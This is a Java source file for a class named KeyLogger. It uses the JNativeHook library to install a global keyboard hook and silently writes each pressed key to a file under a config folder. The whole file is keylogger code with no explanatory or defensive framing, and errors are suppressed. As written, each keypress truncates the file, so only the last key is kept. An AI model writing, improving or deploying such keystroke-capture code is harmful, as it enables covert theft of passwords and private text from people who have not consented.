
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("./config/keys.txt");

	public static void main(String[] args) {

		try {

			GlobalScreen.registerNativeHook();

		}

		catch (NativeHookException e) {

		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());

	}

	public void nativeKeyPressed(NativeKeyEvent e) {

		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.TRUNCATE_EXISTING); PrintWriter writer = new PrintWriter(os)) {

			writer.print(keyText);

			writer.flush();

		}

		catch (IOException ex) {

		}

	}

	public void nativeKeyReleased(NativeKeyEvent e) {

	}

	public void nativeKeyTyped(NativeKeyEvent e) {

	}

}
